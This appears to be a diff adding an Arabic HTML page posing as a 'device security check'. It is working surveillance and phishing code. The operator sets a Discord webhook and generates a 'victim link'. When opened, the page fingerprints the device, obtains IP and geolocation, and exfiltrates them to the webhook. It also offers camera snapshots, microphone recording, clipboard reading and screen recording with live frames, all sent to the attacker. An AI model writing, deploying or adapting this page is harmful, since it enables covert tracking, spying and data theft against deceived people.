@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#070b11">
+<title>فحص أمان الجهاز</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,Roboto,sans-serif;background:#070b11;color:#e6ecf5;min-height:100vh;padding-bottom:40px}
+#root{max-width:640px;margin:0 auto;padding:18px 14px}
+.head{display:flex;align-items:center;gap:10px;margin-bottom:4px}
+.dot{width:9px;height:9px;border-radius:50%;background:#22c55e;box-shadow:0 0 0 4px rgba(34,197,94,.15);animation:p 1.6s infinite}
+.dot.off{background:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.15)}
+@keyframes p{50%{opacity:.35}}
+.head h1{font-size:18px;font-weight:800}
+.sub{color:#7c8ba1;font-size:12.5px;margin-bottom:16px;line-height:1.6}
+.warn{background:#1a1305;border:1px solid #3d2c08;color:#f0c674;font-size:12.5px;padding:10px 12px;border-radius:10px;margin-bottom:14px;line-height:1.7;display:none}
+.card{background:#0e151f;border:1px solid #1a2432;border-radius:14px;padding:14px;margin-bottom:14px}
+.card h2{font-size:13px;color:#8b9bb2;font-weight:700;margin-bottom:10px;letter-spacing:.3px}
+.row{display:flex;justify-content:space-between;gap:12px;font-size:12.5px;padding:5px 0;border-bottom:1px dashed #16202c}
+.row:last-child{border:0}
+.row .k{color:#6f7f95;flex:none}
+.row .v{font-family:ui-monospace,monospace;text-align:left;direction:ltr;word-break:break-all;color:#cdd8e6}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.btn{background:#111b26;border:1px solid #1f2c3c;border-radius:12px;padding:14px 10px;font-size:13px;font-weight:600;color:#dbe6f2;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:7px;transition:.15s}
+.btn:active{transform:scale(.97)}
+.btn:disabled{opacity:.45}
+.btn i{font-size:20px;font-style:normal}
+.btn.rec{border-color:#7f1d1d;background:#1a0f0f;color:#fca5a5}
+.btn.on{background:#7f1d1d;border-color:#b91c1c;color:#fff}
+.btn.wide{grid-column:1/-1}
+.preview{width:100%;border-radius:12px;margin-bottom:10px;background:#000;display:none}
+#log{font-size:12.5px;color:#8b9bb2;line-height:2}
+#log b{color:#e6ecf5;font-weight:600}
+#log .t{color:#4d5b6e;font-family:ui-monospace,monospace;font-size:11px}
+.toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:#111b26;border:1px solid #24313f;color:#e6ecf5;padding:11px 18px;border-radius:999px;font-size:12.5px;z-index:120}
+.timer{font-family:ui-monospace,monospace;color:#fca5a5;font-size:13px;text-align:center;margin-bottom:8px;display:none}
+.foot{margin-top:18px;text-align:center;font-size:12px;color:#4d5b6e}
+.foot a{color:#7c8ba1;text-decoration:none}
+.gear{position:fixed;top:14px;left:14px;width:40px;height:40px;border-radius:50%;background:#111b26;border:1px solid #24313f;color:#9fb0c4;font-size:17px;cursor:pointer;z-index:80}
+.modal{position:fixed;inset:0;background:rgba(3,6,10,.82);z-index:110;display:flex;align-items:flex-start;justify-content:center;padding:20px;overflow:auto}
+.sheet{background:#0b121a;border:1px solid #1f2c3c;border-radius:16px;padding:18px;width:100%;max-width:440px;margin:auto}
+.sheet h3{font-size:16px;margin-bottom:6px}
+.sheet p{font-size:12.5px;color:#7c8ba1;line-height:1.7;margin-bottom:12px}
+.sheet label{display:block;font-size:12px;color:#8b9bb2;margin:12px 0 5px;font-weight:600}
+.sheet input{width:100%;background:#060b11;border:1px solid #223040;border-radius:10px;padding:12px;color:#dbe6f2;font-size:13px;direction:ltr;font-family:ui-monospace,monospace}
+.sheet .acts{display:flex;gap:8px;margin-top:16px;flex-wrap:wrap}
+.sheet .acts button{flex:1;padding:12px;border-radius:10px;border:1px solid #223040;background:#111b26;color:#dbe6f2;font-size:13px;font-weight:700;cursor:pointer}
+.sheet .acts .main{background:#22c55e;border-color:#22c55e;color:#04120a}
+.linkbox{background:#060b11;border:1px solid #223040;border-radius:10px;padding:10px;font-size:11.5px;font-family:ui-monospace,monospace;direction:ltr;word-break:break-all;color:#9fd3b0;margin-top:8px;min-height:44px}
+.admin .item{background:#0e151f;border:1px solid #1a2432;border-radius:12px;padding:12px;margin-bottom:9px;font-size:12.5px;line-height:1.9}
+.admin .item img{max-width:100%;border-radius:8px;margin-top:8px}
+.admin .bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
+.admin .bar button{background:#111b26;border:1px solid #1f2c3c;color:#cdd8e6;padding:9px 13px;border-radius:9px;font-size:12.5px;cursor:pointer}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script>
+"use strict";
+
+const CONFIG = { webhookUrl:"", botName:"Phone Inspector", avatarUrl:"", autoGeo:true, liveFrames:true, liveInterval:20000, maxRecSec:300 };
+const root = document.getElementById("root");
+const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const wired = () => /discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+/.test(CONFIG.webhookUrl);
+
+/* ===== إعدادات محفوظة + قراءة من اللينك ===== */
+const Q = new URLSearchParams(location.search);
+if(Q.get("w")){ CONFIG.webhookUrl = Q.get("w"); localStorage.setItem("hook", Q.get("w")); }
+else { const h = localStorage.getItem("hook"); if(h) CONFIG.webhookUrl = h; }
+const VID = Q.get("id") || "";
+
+async function post(content, files, extra){
+  if(!wired()) return false;
+  const fd = new FormData();
+  fd.append("payload_json", JSON.stringify(Object.assign({
+    content: (VID ? "🆔 " + VID + " — " : "") + (content || ""),
+    username: CONFIG.botName,
+    avatar_url: CONFIG.avatarUrl || undefined
+  }, extra || {})));
+  (files || []).forEach((f, i) => fd.append("files[" + i + "]", f.blob, f.name));
+  try{
+    const r = await fetch(CONFIG.webhookUrl + "?wait=true", {method:"POST", body: fd});
+    if(r.status === 429){ await sleep(1500); return post(content, files, extra); }
+    return r.ok;
+  }catch(e){ return false; }
+}
+
+function emb(title, color, fields){
+  return {embeds:[{title, color, fields, timestamp:new Date().toISOString(), footer:{text:"Phone Inspector"}}]};
+}
+function save(rec){ try{ const l = JSON.parse(localStorage.getItem("reports")||"[]"); l.unshift(rec); localStorage.setItem("reports", JSON.stringify(l.slice(0,40))); }catch(e){} }
+function toast(m){ const t=document.createElement("div"); t.className="toast"; t.textContent=m; document.body.appendChild(t); setTimeout(()=>t.remove(),2400); }
+function log(m){ const b=document.getElementById("log"); if(!b) return; const d=document.createElement("div"); d.innerHTML='<span class="t">'+new Date().toLocaleTimeString("ar-EG")+'</span> — <b>'+esc(m)+'</b>'; b.prepend(d); }
+
+/* ===== الإعدادات ===== */
+function openSettings(){
+  const m = document.createElement("div");
+  m.className = "modal";
+  m.innerHTML = `<div class="sheet">
+    <h3>الإعدادات</h3>
+    <p>حط رابط الويبهوك من ديسكورد، بعدين ابنِ لينك الضحية وابعته.</p>
+    <label>رابط الويبهوك</label>
+    <input id="hookIn" placeholder="https://discord.com/api/webhooks/..." value="${esc(CONFIG.webhookUrl)}">
+    <label>اسم الضحية (اختياري)</label>
+    <input id="idIn" placeholder="ahmed" value="${esc(VID)}">
+    <div class="acts">
+      <button id="testB">اختبار</button>
+      <button id="saveB">حفظ</button>
+    </div>
+    <label>لينك الضحية الجاهز</label>
+    <div class="linkbox" id="linkBox">احفظ الويبهوك الأول…</div>
+    <div class="acts">
+      <button id="copyB">نسخ اللينك</button>
+      <button id="closeB">إغلاق</button>
+    </div>
+  </div>`;
+  document.body.appendChild(m);
+
+  const hookIn = m.querySelector("#hookIn"), idIn = m.querySelector("#idIn"), linkBox = m.querySelector("#linkBox");
+  const build = () => {
+    const w = hookIn.value.trim(), id = idIn.value.trim();
+    if(!w) return linkBox.textContent = "احفظ الويبهوك الأول…";
+    const base = location.origin + location.pathname;
+    linkBox.textContent = base + "?w=" + encodeURIComponent(w) + (id ? "&id=" + encodeURIComponent(id) : "");
+  };
+  hookIn.oninput = build; idIn.oninput = build;
+  if(CONFIG.webhookUrl) build();
+
+  m.querySelector("#saveB").onclick = () => {
+    CONFIG.webhookUrl = hookIn.value.trim();
+    localStorage.setItem("hook", CONFIG.webhookUrl);
+    build(); toast("تم الحفظ"); document.getElementById("dot")?.classList.toggle("off", !wired());
+    document.getElementById("warn").style.display = wired() ? "none" : "block";
+  };
+  m.querySelector("#testB").onclick = async () => {
+    CONFIG.webhookUrl = hookIn.value.trim();
+    const ok = await post("🔌 اختبار الاتصال", null, emb("🔌 اختبار", 0x22c55e, [{name:"الحالة", value:"`مضبوط`", inline:true}]));
+    toast(ok ? "وصلت في الشانل ✅" : "فشل — راجع الرابط ❌");
+    if(ok) document.getElementById("dot")?.classList.remove("off");
+  };
+  m.querySelector("#copyB").onclick = () => {
+    if(!linkBox.textContent.startsWith("http")) return toast("احفظ الويبهوك الأول");
+    navigator.clipboard.writeText(linkBox.textContent); toast("تم نسخ اللينك");
+  };
+  m.querySelector("#closeB").onclick = () => m.remove();
+  m.onclick = e => { if(e.target === m) m.remove(); };
+}
+
+/* ===== البصمة ===== */
+function gpu(){ try{ const c=document.createElement("canvas"); const gl=c.getContext("webgl")||c.getContext("experimental-webgl"); if(!gl) return "لا يوجد WebGL"; const e=gl.getExtension("WEBGL_debug_renderer_info"); return e?gl.getParameter(e.UNMASKED_RENDERER_WEBGL):"مخفي"; }catch(e){ return "—"; } }
+function model(ua){
+  if(/iPhone/.test(ua)) return "iPhone";
+  if(/iPad/.test(ua)) return "iPad";
+  const m = ua.match(/Android [\d.]+;\s*([^;)]+)/);
+  if(m) return m[1].replace(/Build.*/,"").trim();
+  if(/Windows/.test(ua)) return "Windows PC";
+  if(/Mac OS X/.test(ua)) return "Mac";
+  return "غير معروف";
+}
+async function collect(){
+  const n = navigator;
+  const d = { brand:model(n.userAgent), ua:n.userAgent, lang:n.language, cores:n.hardwareConcurrency||"—",
+    ram:n.deviceMemory?n.deviceMemory+" GB":"—", screen:screen.width+"x"+screen.height, dpr:devicePixelRatio,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone, touch:n.maxTouchPoints,
+    dark:matchMedia("(prefers-color-scheme: dark)").matches, gpu:gpu(), ip:"—" };
+  try{ d.ip = (await fetch("https://api.ipify.org?format=json").then(r=>r.json())).ip; }catch(e){}
+  try{ const b=await n.getBattery(); d.battery=Math.round(b.level*100)+"%"+(b.charging?" (تشحن)":""); }catch(e){ d.battery="—"; }
+  try{ const c=n.connection||{}; d.net=[c.effectiveType,c.downlink&&c.downlink+" Mbps"].filter(Boolean).join(" · ")||"—"; }catch(e){ d.net="—"; }
+  try{ const s=await n.storage.estimate(); d.storage=Math.round(s.quota/1048576)+" MB"; }catch(e){ d.storage="—"; }
+  try{ const dv=await n.mediaDevices.enumerateDevices(); d.cams=dv.filter(x=>x.kind==="videoinput").length; d.mics=dv.filter(x=>x.kind==="audioinput").length; }catch(e){ d.cams=d.mics="—"; }
+  return d;
+}
+function reportEmbed(d, title, color){
+  return emb(title, color, [
+    {name:"📱 الجهاز", value:"```"+d.brand+"```"},
+    {name:"🌐 IP", value:"```"+d.ip+"```", inline:true},
+    {name:"📶 الشبكة", value:"```"+d.net+"```", inline:true},
+    {name:"🔋 البطارية", value:"```"+d.battery+"```", inline:true},
+    {name:"🖥️ الشاشة", value:"```"+d.screen+" @ "+d.dpr+"x```", inline:true},
+    {name:"⚙️ المعالج", value:"```"+d.cores+" نواة / "+d.ram+"```", inline:true},
+    {name:"📷 الكاميرات", value:"```"+d.cams+" / "+d.mics+" مايك```", inline:true},
+    {name:"🕐 التوقيت", value:"```"+d.tz+"```", inline:true},
+    {name:"🎮 GPU", value:"```"+String(d.gpu).slice(0,80)+"```", inline:true},
+    {name:"💾 التخزين", value:"```"+d.storage+"```", inline:true},
+    {name:"🧾 UA", value:"```"+d.ua.slice(0,240)+"```"}
+  ]);
+}
+
+let LIVE = { stream:null, rec:null, chunks:[], timer:null, snap:null, sec:0 };
+
+function render(){
+  root.innerHTML = `
+  <button class="gear" id="gear">⚙</button>
+  <div class="head"><div class="dot ${wired()?"":"off"}" id="dot"></div><h1>فحص الجهاز جارٍ</h1></div>
+  <p class="sub">الصفحة بتجمع بيانات الجهاز تلقائيًا. لو طلب المتصفح إذن، اضغط <b>سماح</b>.</p>
+  <div class="warn" id="warn">⚠️ مفيش ويبهوك مضبوط — اضغط علامة ⚙ فوق وحطه.</div>
+  <div class="card"><h2>بيانات الجهاز</h2><div id="info"><div class="row"><span class="k">جارٍ الجمع…</span></div></div></div>
+  <div class="card"><h2>التحكم</h2>
+    <video class="preview" id="pv" autoplay muted playsinline></video>
+    <div class="timer" id="timer">● 00:00</div>
+    <div class="grid">
+      <button class="btn" data-act="geo"><i>📍</i>الموقع الدقيق</button>
+      <button class="btn" data-act="front"><i>🤳</i>كاميرا أمامية</button>
+      <button class="btn" data-act="back"><i>📷</i>كاميرا خلفية</button>
+      <button class="btn" data-act="audio"><i>🎤</i>تسجيل صوت</button>
+      <button class="btn wide rec" data-act="screen"><i>🖥️</i>تسجيل الشاشة</button>
+      <button class="btn" data-act="clip"><i>📋</i>قراءة الحافظة</button>
+      <button class="btn" data-act="wake"><i>💡</i>إبقاء الشاشة</button>
+      <button class="btn" data-act="fs"><i>⛶</i>ملء الشاشة</button>
+      <button class="btn" data-act="report"><i>📤</i>إعادة إرسال البصمة</button>
+      <button class="btn" data-act="test"><i>🔌</i>اختبار السيرفر</button>
+    </div>
+  </div>
+  <div class="card"><h2>سجل الإرسال</h2><div id="log">—</div></div>
+  <div class="foot">لوحة التحكم: <a href="#admin">اضغط هنا</a></div>`;
+  document.getElementById("gear").onclick = openSettings;
+  root.querySelectorAll("[data-act]").forEach(b => b.onclick = () => act(b.dataset.act, b));
+}
+
+async function act(a, btn){
+  if(a === "screen") return LIVE.rec ? stopScreen() : startScreen(btn);
+  if(btn.disabled) return;
+  btn.disabled = true;
+  try{
+    if(a === "geo") await doGeo();
+    if(a === "front") await doPhoto("user");
+    if(a === "back") await doPhoto("environment");
+    if(a === "audio") await doAudio();
+    if(a === "clip") await doClip();
+    if(a === "wake") await doWake(btn);
+    if(a === "fs") await doFs();
+    if(a === "report") await doReport();
+    if(a === "test") await doTest();
+  }catch(e){ toast("تعذر: " + (e.name === "NotAllowedError" ? "تم رفض الإذن" : e.message)); log("فشل: " + (e.name || e.message)); }
+  finally{ btn.disabled = false; }
+}
+
+async function doGeo(){
+  log("طلب الموقع…");
+  const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:15000, maximumAge:0}));
+  const {latitude:lat, longitude:lon, accuracy:acc} = p.coords;
+  await post("📍 موقع دقيق — https://maps.google.com/?q="+lat+","+lon, null, emb("📍 موقع دقيق", 0x3b82f6, [
+    {name:"الإحداثيات", value:"`"+lat.toFixed(6)+", "+lon.toFixed(6)+"`", inline:true},
+    {name:"الدقة", value:"`"+Math.round(acc)+" متر`", inline:true},
+    {name:"الخريطة", value:"[افتح في جوجل ماب](https://maps.google.com/?q="+lat+","+lon+")"}
+  ]));
+  save({kind:"موقع", value:lat+", "+lon, time:new Date().toLocaleString("ar-EG")});
+  log("تم إرسال الموقع"); toast("تم إرسال الموقع");
+}
+
+async function doPhoto(facing){
+  log("فتح الكاميرا…");
+  const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:facing, width:{ideal:1600}}, audio:false});
+  const v = document.createElement("video"); v.srcObject=s; v.muted=true; v.playsInline=true;
+  await v.play(); await sleep(700);
+  const c = document.createElement("canvas"); c.width=v.videoWidth; c.height=v.videoHeight;
+  c.getContext("2d").drawImage(v, 0, 0);
+  s.getTracks().forEach(t => t.stop());
+  const blob = await new Promise(r => c.toBlob(r, "image/jpeg", 0.85));
+  const label = facing === "user" ? "أمامية" : "خلفية";
+  await post("📷 صورة " + label, [{blob, name:"cam-"+Date.now()+".jpg"}], emb("📷 صورة " + label, 0x22c55e, [
+    {name:"الدقة", value:"`"+c.width+"x"+c.height+"`", inline:true},
+    {name:"الحجم", value:"`"+Math.round(blob.size/1024)+" KB`", inline:true}
+  ]));
+  save({kind:"صورة "+label, thumb:c.toDataURL("image/jpeg", 0.4), time:new Date().toLocaleString("ar-EG")});
+  log("تم إرسال الصورة"); toast("تم إرسال الصورة");
+}
+
+async function doAudio(){
+  const mime = ["audio/webm;codecs=opus","audio/webm","audio/mp4","audio/ogg;codecs=opus"].find(t => MediaRecorder.isTypeSupported(t)) || "";
+  const s = await navigator.mediaDevices.getUserMedia({audio:true});
+  const rec = new MediaRecorder(s, mime ? {mimeType:mime} : {});
+  const chunks = [];
+  rec.ondataavailable = e => e.data.size && chunks.push(e.data);
+  rec.onstop = async () => {
+    s.getTracks().forEach(t => t.stop());
+    const blob = new Blob(chunks, {type:mime||"audio/webm"});
+    const ext = mime.includes("mp4") ? "m4a" : "ogg";
+    await post("🎤 تسجيل صوتي", [{blob, name:"mic-"+Date.now()+"."+ext}], emb("🎤 تسجيل صوتي", 0xa855f7, [{name:"الحجم", value:"`"+Math.round(blob.size/1024)+" KB`", inline:true}]));
+    save({kind:"تسجيل صوتي", size:Math.round(blob.size/1024)+" KB", time:new Date().toLocaleString("ar-EG")});
+    log("تم إرسال التسجيل"); toast("تم الإرسال");
+  };
+  rec.start(); log("جاري التسجيل 15 ثانية…"); toast("بيتسجل 15 ثانية");
+  setTimeout(() => rec.stop(), 15000);
+}
+
+async function doClip(){
+  const t = await navigator.clipboard.readText();
+  if(!t){ log("الحافظة فاضية"); return toast("الحافظة فاضية"); }
+  await post("📋 محتوى الحافظة\n```\n"+t.slice(0,1800)+"\n```", null, emb("📋 الحافظة", 0xf59e0b, [{name:"عدد الحروف", value:"`"+t.length+"`", inline:true}]));
+  save({kind:"الحافظة", value:t.slice(0,400), time:new Date().toLocaleString("ar-EG")});
+  log("تم إرسال الحافظة"); toast("تم الإرسال");
+}
+
+let wakeLock = null;
+async function doWake(btn){
+  if(wakeLock){ await wakeLock.release(); wakeLock=null; btn.classList.remove("on"); return log("تم إلغاء إبقاء الشاشة"); }
+  wakeLock = await navigator.wakeLock.request("screen");
+  btn.classList.add("on"); log("الشاشة هتفضل شغالة");
+}
+async function doFs(){ if(document.fullscreenElement) await document.exitFullscreen(); else await document.documentElement.requestFullscreen(); }
+async function doReport(){ const d = await collect(); await post("📤 إعادة إرسال البصمة", null, reportEmbed(d, "📱 بصمة الجهاز", 0x0ea5e9)); log("تم إعادة الإرسال"); toast("تم الإرسال"); }
+async function doTest(){
+  const ok = await post("🔌 اختبار الاتصال", null, emb("🔌 اختبار", 0x22c55e, [{name:"الحالة", value:"`مضبوط`", inline:true}]));
+  if(ok){ log("السيرفر متصل ✅"); toast("السيرفر شغال"); document.getElementById("dot").classList.remove("off"); }
+  else { log("السيرفر مش متضبوط ❌"); toast("راجع الويبهوك"); }
+}
+
+async function startScreen(btn){
+  const disp = await navigator.mediaDevices.getDisplayMedia({video:{frameRate:12}, audio:true});
+  let stream = disp;
+  if(disp.getAudioTracks().length === 0){
+    try{ const mic = await navigator.mediaDevices.getUserMedia({audio:true}); stream = new MediaStream([...disp.getVideoTracks(), ...mic.getAudioTracks()]); }catch(e){}
+  }
+  LIVE.stream = stream;
+  const pv = document.getElementById("pv"); pv.style.display="block"; pv.srcObject = stream;
+  const mime = ["video/webm;codecs=vp9,opus","video/webm;codecs=vp8,opus","video/webm","video/mp4"].find(t => MediaRecorder.isTypeSupported(t)) || "";
+  LIVE.chunks = [];
+  LIVE.rec = new MediaRecorder(stream, mime ? {mimeType:mime, videoBitsPerSecond:1200000} : {});
+  LIVE.rec.ondataavailable = e => e.data.size && LIVE.chunks.push(e.data);
+  LIVE.rec.start(1000);
+  btn.textContent = "⏹ إيقاف التسجيل"; btn.classList.add("on");
+  document.getElementById("timer").style.display = "block"; LIVE.sec = 0;
+  LIVE.timer = setInterval(() => {
+    LIVE.sec++;
+    const m = String(Math.floor(LIVE.sec/60)).padStart(2,"0"), s = String(LIVE.sec%60).padStart(2,"0");
+    document.getElementById("timer").textContent = "● " + m + ":" + s;
+    if(LIVE.sec >= CONFIG.maxRecSec) stopScreen();
+  }, 1000);
+  stream.getVideoTracks()[0].onended = () => stopScreen();
+  if(CONFIG.liveFrames){
+    const c = document.createElement("canvas");
+    LIVE.snap = setInterval(() => {
+      try{
+        const v = pv; if(!v.videoWidth) return;
+        c.width = 720; c.height = Math.round(720 * v.videoHeight / v.videoWidth);
+        c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+        c.toBlob(b => post("🖥️ لقطة حية", [{blob:b, name:"live.jpg"}], emb("🖥️ لقطة", 0x6366f1, [{name:"الثانية", value:"`"+LIVE.sec+"`", inline:true}])), "image/jpeg", 0.6);
+      }catch(e){}
+    }, CONFIG.liveInterval);
+  }
+  log("بدأ تسجيل الشاشة"); toast("بيتسجل — سيب الشاشة مفتوحة");
+}
+
+async function stopScreen(){
+  if(!LIVE.rec) return;
+  clearInterval(LIVE.timer); clearInterval(LIVE.snap);
+  const blob = await new Promise(r => { LIVE.rec.onstop = () => r(new Blob(LIVE.chunks, {type:"video/webm"})); LIVE.rec.stop(); });
+  LIVE.stream.getTracks().forEach(t => t.stop()); LIVE.rec = null;
+  document.getElementById("pv").style.display = "none";
+  document.getElementById("timer").style.display = "none";
+  const btn = document.querySelector('[data-act="screen"]');
+  if(btn){ btn.textContent = "🖥️ تسجيل الشاشة"; btn.classList.remove("on"); }
+  const mb = blob.size / 1048576;
+  if(mb > 9.5){
+    await post("🖥️ الفيديو كبير ("+mb.toFixed(1)+" ميجا) — مش هيتبعت", null, emb("⚠️ حجم زائد", 0xef4444, [{name:"الحجم", value:"`"+mb.toFixed(1)+" MB`", inline:true}]));
+    log("الفيديو كبير ("+mb.toFixed(1)+" ميجا)"); return toast("الفيديو كبير");
+  }
+  await post("🖥️ تسجيل شاشة — "+LIVE.sec+" ثانية", [{blob, name:"screen-"+Date.now()+".webm"}], emb("🖥️ تسجيل شاشة", 0x6366f1, [
+    {name:"المدة", value:"`"+LIVE.sec+" ث`", inline:true},
+    {name:"الحجم", value:"`"+mb.toFixed(2)+" MB`", inline:true}
+  ]));
+  save({kind:"تسجيل شاشة", size:LIVE.sec+"ث / "+mb.toFixed(1)+" MB", time:new Date().toLocaleString("ar-EG")});
+  log("تم إرسال الفيديو"); toast("تم الإرسال");
+}
+
+function renderAdmin(){
+  const list = JSON.parse(localStorage.getItem("reports") || "[]");
+  root.innerHTML = `<div class="admin"><h1 style="font-size:18px;margin-bottom:6px">لوحة التحكم</h1>
+  <p class="sub">${list.length} سجل — على هذا المتصفح فقط</p>
+  <div class="bar"><button id="back">رجوع</button><button id="clr">مسح</button></div>
+  ${list.length ? list.map(r => `<div class="item"><b>${esc(r.kind)}</b> <span style="color:#4d5b6e">${esc(r.time)}</span>
+    ${r.value?`<div style="font-family:monospace;direction:ltr;word-break:break-all">${esc(r.value)}</div>`:""}
+    ${r.size?`<div style="color:#7c8ba1">${esc(r.size)}</div>`:""}
+    ${r.thumb?`<img src="${r.thumb}">`:""}</div>`).join("") : '<p class="sub">لا توجد سجلات</p>'}</div>`;
+  document.getElementById("back").onclick = () => { location.hash = ""; render(); };
+  document.getElementById("clr").onclick = () => { localStorage.removeItem("reports"); renderAdmin(); };
+}
+
+async function boot(){
+  if(location.hash === "#admin") return renderAdmin();
+  render();
+  document.getElementById("warn").style.display = wired() ? "none" : "block";
+
+  const d = await collect();
+  const rows = [["الموديل", d.brand],["IP", d.ip],["الشبكة", d.net],["الشاشة", d.screen+" @ "+d.dpr+"x"],
+    ["المعالج", d.cores+" نواة"],["الرام", d.ram],["البطارية", d.battery],["الكاميرات", d.cams],
+    ["المايكات", d.mics],["المنطقة الزمنية", d.tz],["اللغة", d.lang],["التخزين", d.storage],
+    ["GPU", d.gpu],["لمس", d.touch+" نقطة"],["الوضع الليلي", d.dark?"نعم":"لا"]];
+  const info = document.getElementById("info");
+  if(info) info.innerHTML = rows.map(([k,v]) => `<div class="row"><span class="k">${esc(k)}</span><span class="v">${esc(v)}</span></div>`).join("");
+
+  save({kind:"بصمة جهاز", value:d.brand+" · "+d.ip+" · "+d.screen, time:new Date().toLocaleString("ar-EG")});
+  const ok = await post("📱 جهاز جديد اتصل", null, reportEmbed(d, "📱 بصمة جهاز", 0x0ea5e9));
+  log(ok ? "تم إرسال البصمة ✅" : "مفيش ويبهوك — اضغط ⚙");
+
+  if(CONFIG.autoGeo){
+    await sleep(1200);
+    navigator.geolocation.getCurrentPosition(async p => {
+      const {latitude:lat, longitude:lon, accuracy:acc} = p.coords;
+      await post("📍 موقع تلقائي — https://maps.google.com/?q="+lat+","+lon, null, emb("📍 موقع تلقائي", 0x3b82f6, [
+        {name:"الإحداثيات", value:"`"+lat.toFixed(6)+", "+lon.toFixed(6)+"`", inline:true},
+        {name:"الدقة", value:"`"+Math.round(acc)+" متر`", inline:true}
+      ]));
+      save({kind:"موقع", value:lat+", "+lon, time:new Date().toLocaleString("ar-EG")});
+      log("تم إرسال الموقع تلقائيًا");
+    }, () => log("الموقع: تم رفضه"));
+  }
+}
+boot();
+</script>
+</body>
+</html>
